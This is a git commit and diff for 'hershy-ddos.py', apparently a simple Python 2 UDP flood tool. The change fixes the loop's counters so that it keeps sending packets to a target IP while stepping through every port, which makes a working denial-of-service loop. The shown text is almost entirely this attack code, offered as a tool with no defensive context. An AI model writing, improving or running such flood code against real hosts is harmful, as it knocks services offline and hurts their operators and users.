24820e233247cca648365761563f10f1b080a683
Kak.scot <66765981+KAKsaro@users.noreply.github.com>
2020-06-23 15:12:33 +0300

    Update hershy-ddos.py
    Edited by kak.saro

--- hershy-ddos.py
+++ hershy-ddos.py
@@ -44,8 +44,8 @@ time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     nardny = nardny + 1
-     Sent = sent + 1
+     sent = sent + 1
+     port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
